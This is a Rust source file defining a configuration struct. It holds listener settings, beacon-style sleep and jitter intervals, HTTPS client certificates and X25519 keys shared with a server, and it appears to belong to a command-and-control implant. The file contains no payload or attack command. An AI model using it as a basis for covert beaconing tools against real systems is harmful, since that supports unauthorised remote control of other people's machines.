use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};

use super::listener::ListenerConfig;

pub struct Config {
    pub listener: ListenerConfig,
    pub sleep: u64,
    pub jitter: u64,

    pub server_public_key: PublicKey,
    pub my_secret_key: StaticSecret,
    pub my_public_key: PublicKey,
    pub shared_secret: SharedSecret,
}

impl Config {
    pub fn new(
        proto: String,
        host: String,
        port: u16,
        sleep: u64,
        jitter: u64,
        user_agent: String,
        https_root_cert: String,
        https_client_cert: String,
        https_client_key: String,
        server_public_key: PublicKey,
        my_secret_key: StaticSecret,
        my_public_key: PublicKey,
        shared_secret: SharedSecret,
    ) -> Self {
        Self {
            listener: ListenerConfig::new(
                proto,
                host,
                port,
                user_agent,
                https_root_cert,
                https_client_cert,
                https_client_key,
            ),
            sleep,
            jitter,
            server_public_key,
            my_secret_key,
            my_public_key,
            shared_secret,
        }
    }
}